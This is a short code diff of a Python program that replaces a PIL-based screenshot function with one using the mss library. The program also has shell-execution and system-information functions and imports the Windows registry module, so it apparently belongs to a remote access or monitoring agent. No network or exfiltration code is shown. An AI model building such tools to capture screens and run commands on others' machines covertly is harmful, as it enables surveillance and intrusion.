@@ -4,7 +4,7 @@ import subprocess
 import platform
 import socket
 import os
-import io
+import mss, mss.tools
 import sys
 import winreg
 from PIL import ImageGrab
@@ -23,10 +23,10 @@ def run_shell(command):
 
 
 def take_screenshot():
-    img = ImageGrab.grab()
-    buf = io.BytesIO()
-    img.save(buf, format="PNG")
-    return buf.getvalue()
+
+    with mss.mss() as sct:
+        shot = sct.grab(sct.monitors[0])
+        return mss.tools.to_png(shot.rgb, shot.size)
 
 
 def get_sysinfo():
